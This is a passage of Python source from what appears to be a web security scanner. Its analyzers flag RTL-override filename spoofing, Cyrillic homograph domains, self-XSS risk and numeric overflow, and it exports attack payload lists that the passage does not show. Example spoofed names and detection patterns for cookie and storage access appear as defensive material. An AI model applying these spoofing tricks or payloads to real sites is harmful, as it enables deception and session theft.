                        "(e.g., 'legit\u202efdp.exe' displays as 'legit.pdf')."
                    ),
                    cwe_id="CWE-434",
                    cwe_name="Unrestricted Upload of File with Dangerous Type",
                    url=url,
                    evidence="File upload input detected",
                    remediation=(
                        "Sanitize uploaded filenames. "
                        "Strip all Unicode control characters. "
                        "Validate file type by magic bytes, not extension."
                    ),
                    cvss_score=3.7,
                )
            )

        return findings

    def _analyze_homograph_vuln(
        self,
        url: str,
        html_content: str,
    ) -> list[Finding]:
        """Detect homograph/lookalike character vulnerabilities."""
        findings: list[Finding] = []

        # Check for Cyrillic, Greek, or other lookalike characters
        lookalike_ranges = [
            (0x0400, 0x04FF, "Cyrillic"),  # Cyrillic
            (0x0370, 0x03FF, "Greek"),  # Greek
            (0xFF00, 0xFFEF, "Fullwidth"),  # Full-width chars
        ]

        found_lookalikes = []
        for start, end, name in lookalike_ranges:
            for char in html_content:
                if start <= ord(char) <= end:
                    found_lookalikes.append((name, char))
                    break

        if found_lookalikes:
            unique_scripts = set(name for name, _ in found_lookalikes)
            findings.append(
                self._create_finding(
                    severity=Severity.LOW,
                    title="Non-ASCII Lookalike Characters Detected",
                    description=(
                        f"Found characters from {', '.join(unique_scripts)} script(s). "
                        "These can be used in homograph attacks where 'apple.com' "
                        "becomes '\u0430pple.com' (Cyrillic 'a')."
                    ),
                    cwe_id="CWE-1007",
                    cwe_name="Insufficient Visual Distinction of Homoglyphs Renders Key Information Illegible",
                    url=url,
                    evidence=f"Scripts found: {unique_scripts}",
                    remediation=(
                        "Normalize Unicode to ASCII for security comparisons. "
                        "Display IDN domains in Punycode. "
                        "Warn users about mixed-script content."
                    ),
                    cvss_score=3.1,
                    metadata={
                        "attack_type": "homograph_attack",
                        "payloads": self.HOMOGRAPH_PAYLOADS[:5],
                    },
                )
            )

        return findings

    def _analyze_self_xss_vuln(
        self,
        url: str,
        html_content: str,
        scripts: list[Any],
    ) -> list[Finding]:
        """Detect self-XSS escalation risks."""
        findings: list[Finding] = []

        all_content = html_content
        for script in scripts:
            if isinstance(script, str):
                all_content += "\n" + script

        # Check for console warnings (good defense)
        console_warning_patterns = [
            r"console\.warn",
            r"console\.log.*(?:warning|caution|danger)",
            r"Stop!.*This is a browser feature",
        ]

        has_console_warning = any(
            re.search(p, all_content, re.IGNORECASE)
            for p in console_warning_patterns
        )

        # Check for bookmark-friendly patterns
        bookmark_risks = [
            r"javascript:",  # javascript: URLs
            r"data:text/html",  # data URLs
            r"localStorage\.",  # localStorage access
            r"sessionStorage\.",  # sessionStorage access
            r"document\.cookie",  # Cookie access
        ]

        found_risks = []
        for pattern in bookmark_risks:
            if re.search(pattern, all_content, re.IGNORECASE):
                found_risks.append(pattern.replace(r"\.", "."))

        if found_risks and not has_console_warning:
            findings.append(
                self._create_finding(
                    severity=Severity.LOW,
                    title="Self-XSS Risk Without Console Warning",
                    description=(
                        f"Page contains {len(found_risks)} self-XSS risk patterns "
                        "but lacks console warning message. Self-XSS can be escalated "
                        "via social engineering to steal session data."
                    ),
                    cwe_id="CWE-79",
                    cwe_name="Improper Neutralization of Input During Web Page Generation",
                    url=url,
                    evidence=f"Risk patterns: {found_risks[:5]}",
                    remediation=(
                        "Add console warning for developer tools: "
                        '"Stop! This is a browser feature for developers." '
                        "Implement CSP to limit inline script execution."
                    ),
                    cvss_score=2.7,
                    metadata={
                        "attack_type": "self_xss_chaining",
                        "payloads": self.SELF_XSS_PAYLOADS[:5],
                    },
                )
            )

        return findings

    def _analyze_math_overflow_vuln(
        self,
        url: str,
        html_content: str,
        scripts: list[Any],
    ) -> list[Finding]:
        """Detect integer/math overflow vulnerabilities."""
        findings: list[Finding] = []

        all_content = html_content
        for script in scripts:
            if isinstance(script, str):
                all_content += "\n" + script

        # Check for numeric input fields
        numeric_patterns = [
            r'type\s*=\s*["\']number["\']',
            r'type\s*=\s*["\']range["\']',
            r'name\s*=\s*["\'][^"\']*(?:id|count|amount|quantity|price|total)[^"\']*["\']',
        ]

        numeric_inputs = []
        for pattern in numeric_patterns:
            matches = re.findall(pattern, html_content, re.IGNORECASE)
            numeric_inputs.extend(matches)

        # Check for JavaScript integer operations
        js_int_patterns = [
            r"parseInt\s*\(",
            r"parseFloat\s*\(",
            r"Number\s*\(",
            r"\|\s*0",  # Bitwise OR with 0 (integer conversion)
            r">>>\s*0",  # Unsigned right shift
        ]

        js_int_ops = []
        for pattern in js_int_patterns:
            if re.search(pattern, all_content):
                js_int_ops.append(pattern)

        if numeric_inputs or js_int_ops:
            findings.append(
                self._create_finding(
                    severity=Severity.LOW,
                    title="Numeric Input Processing Detected - Overflow Risk",
                    description=(
                        f"Found {len(numeric_inputs)} numeric inputs and "
                        f"{len(js_int_ops)} JavaScript integer operations. "
                        "Test with INT_MAX, INT_MIN, and boundary values."
                    ),
                    cwe_id="CWE-190",
                    cwe_name="Integer Overflow or Wraparound",
                    url=url,
                    evidence=f"Inputs: {numeric_inputs[:5]}, Ops: {js_int_ops[:5]}",
                    remediation=(
                        "Validate numeric input against expected bounds. "
                        "Use BigInt for large numbers in JavaScript. "
                        "Check for overflow before arithmetic operations."
                    ),
                    cvss_score=3.1,
                    metadata={
                        "attack_type": "math_overflow",
                        "payloads": self.MATH_OVERFLOW_PAYLOADS[:15],
                    },
                )
            )

        return findings

    def _active_chaos_tests(
        self,
        url: str,
        page_data: dict[str, Any],
    ) -> list[Finding]:
        """Active mode chaos testing (with payloads)."""
        findings: list[Finding] = []

        # In active mode, we would actually send these payloads
        # For now, we report what would be tested

        findings.append(
            self._create_finding(
                severity=Severity.INFO,
                title="Chaos Teen Active Testing Available",
                description=(
                    "Active mode enables full chaos testing with 15 attack categories: "
                    "Emoji injection, Null byte madness, Backwards payloads, "
                    "Mixed case chaos, Double encoding, Whitespace abuse, "
                    "HTTP/0.9 downgrade, Negative array index, Long values, "
                    "Type juggling, Timezone bombs, RTL override, "
                    "Homograph attacks, Self-XSS chaining, Math overflow."
                ),
                cwe_id="CWE-20",
                cwe_name="Improper Input Validation",
                url=url,
                evidence="15 chaos attack categories available",
                remediation="Run active scan with explicit authorization.",
                cvss_score=0.0,
                metadata={
                    "total_payloads": (
                        len(self.EMOJI_PAYLOADS) +
                        len(self.NULL_BYTE_PAYLOADS) +
                        len(self.BACKWARDS_PAYLOADS) +
                        len(self.MIXED_CASE_PAYLOADS) +
                        len(self.DOUBLE_ENCODING_PAYLOADS) +
                        len(self.WHITESPACE_PAYLOADS) +
                        len(self.HTTP09_PATTERNS) +
                        len(self.NEGATIVE_INDEX_PAYLOADS) +
                        len(self.TYPE_JUGGLING_PAYLOADS) +
                        len(self.TIMEZONE_BOMB_PAYLOADS) +
                        len(self.RTL_OVERRIDE_PAYLOADS) +
                        len(self.HOMOGRAPH_PAYLOADS) +
                        len(self.SELF_XSS_PAYLOADS) +
                        len(self.MATH_OVERFLOW_PAYLOADS)
                    ),
                    "attack_categories": 15,
                },
            )
        )

        return findings

    def get_all_payloads(self) -> dict[str, list[str]]:
        """
        Export all chaos payloads for external testing tools.

        Returns dict mapping attack category to payload list.
        """
        return {
            "emoji_injection": self.EMOJI_PAYLOADS,
            "null_byte_madness": self.NULL_BYTE_PAYLOADS,
            "backwards_payload": self.BACKWARDS_PAYLOADS,
            "mixed_case_chaos": self.MIXED_CASE_PAYLOADS,
            "double_encoding_nightmare": self.DOUBLE_ENCODING_PAYLOADS,
            "whitespace_abuse": self.WHITESPACE_PAYLOADS,
            "http09_downgrade": self.HTTP09_PATTERNS,
            "negative_array_index": self.NEGATIVE_INDEX_PAYLOADS,
            "long_value_templates": self.LONG_VALUE_TEMPLATES,
            "type_juggling_php": self.TYPE_JUGGLING_PAYLOADS,
            "timezone_bombs": self.TIMEZONE_BOMB_PAYLOADS,
            "rtl_override": self.RTL_OVERRIDE_PAYLOADS,
            "homograph_attacks": self.HOMOGRAPH_PAYLOADS,
            "self_xss_chaining": self.SELF_XSS_PAYLOADS,
            "math_overflow": self.MATH_OVERFLOW_PAYLOADS,
        }
